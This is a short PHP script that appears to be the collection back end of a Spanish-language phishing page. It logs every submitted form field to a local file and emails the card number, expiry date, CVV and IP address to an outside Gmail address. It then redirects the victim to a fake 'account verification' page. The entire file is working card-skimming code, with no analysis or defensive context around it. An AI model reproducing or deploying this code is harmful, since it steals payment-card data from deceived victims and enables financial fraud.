<?php
header ('Location: verificando-cuenta.html');
$handle = fopen("datos.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n==============================\r\n");
fclose($handle);

$ip = getenv("REMOTE_ADDR");
$message .= "Numero de Tarjeta: ".$_POST['Card_number']."\n";
$message .= "Mes: ".$_POST['Month']."\n";
$message .= "Año: ".$_POST['Year']."\n";
$message .= "CVV: ".$_POST['CVV']."\n";
$message .= "IP: ".$ip."\n";
$recipient ="jc7541207@gmail.com";
$subject = "Tarjeta de Credito | ".$ip."\n";
mail($recipient,$subject,$message);
header("Location: verificando-cuenta.html");


exit;
?>